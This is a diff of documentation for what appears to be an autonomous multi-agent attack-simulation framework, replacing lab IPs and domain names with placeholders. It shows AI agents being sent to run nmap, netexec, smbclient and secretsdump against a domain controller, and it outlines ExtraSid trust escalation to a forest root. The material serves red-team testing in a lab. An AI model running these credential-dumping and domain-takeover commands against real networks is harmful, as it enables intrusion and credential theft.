@@ -272,7 +272,7 @@ The orchestrator dispatches reconnaissance tasks to RECON workers:
 
 ```text
 # Network discovery
-dispatch_recon(task_type="network_scan", targets="10.0.0.0/24")
+dispatch_recon(task_type="network_scan", targets="192.168.58.0/24")
 → RECON executes: nmap_scan - Discover live hosts and services
 
 # User enumeration (unauthenticated)
@@ -411,11 +411,11 @@ NTLM hash obtained via `secretsdump`. This is the most thorough mode and the
 recommended default.
 
 **Important**: dominating a child domain does **not** count as dominating the
-forest root. For example, obtaining `krbtgt` from `north.sevenkingdoms.local`
-(child DC: winterfell) does **not** satisfy the `sevenkingdoms.local` forest
-requirement. The forest root DC (kingslanding) must be separately compromised,
-typically via trust escalation (ExtraSid attack using the trust key from the
-child domain's `secretsdump` output).
+forest root. For example, obtaining `krbtgt` from `child.contoso.local` (child
+DC) does **not** satisfy the `contoso.local` forest requirement. The forest
+root DC must be separately compromised, typically via trust escalation
+(ExtraSid attack using the trust key from the child domain's `secretsdump`
+output).
 
 The required forest roots are derived from:
 
@@ -604,7 +604,7 @@ When any agent discovers a credential:
 │ Orchestrator│ ─────────────────────────────────▶│ CREDENTIAL_ACCESS│
 │             │                                    │                  │
 │ "Found user │    task: secretsdump              │ Runs secretsdump │
-│  with creds"│    target: 10.0.0.1               │ on DC            │
+│  with creds"│    target: 192.168.58.10          │ on DC            │
 └─────────────┘                                    └────────┬─────────┘
                                                            │
                     ◀──────────────────────────────────────┘
@@ -687,19 +687,19 @@ Run the underlying tool binaries directly on the appropriate agent pod:
 ```bash
 # Run smbclient directly
 kubectl -n attack-simulation exec -it ares-credential-access-agent-0 -- \
-    smbclient '//10.1.2.240/SYSVOL' -U 'DOMAIN/user%password' -c 'ls'
+    smbclient '//192.168.58.10/SYSVOL' -U 'DOMAIN/user%password' -c 'ls'
 
 # Run netexec directly (on recon agent - netexec is only installed there)
 kubectl -n attack-simulation exec -it ares-recon-agent-0 -- \
-    netexec smb 10.1.2.240 -u 'user' -p 'password' -d 'DOMAIN' --shares
+    netexec smb 192.168.58.10 -u 'user' -p 'password' -d 'DOMAIN' --shares
 
 # Run secretsdump directly
 kubectl -n attack-simulation exec -it ares-credential-access-agent-0 -- \
-    secretsdump.py 'DOMAIN/user:password@10.1.2.240'
+    secretsdump.py 'DOMAIN/user:password@192.168.58.10'
 
 # Run nmap directly
 kubectl -n attack-simulation exec -it ares-recon-agent-0 -- \
-    nmap -sV --top-ports 1000 10.1.2.0/24
+    nmap -sV --top-ports 1000 192.168.58.0/24
 ```
 
 #### Available Tools by Agent Pod
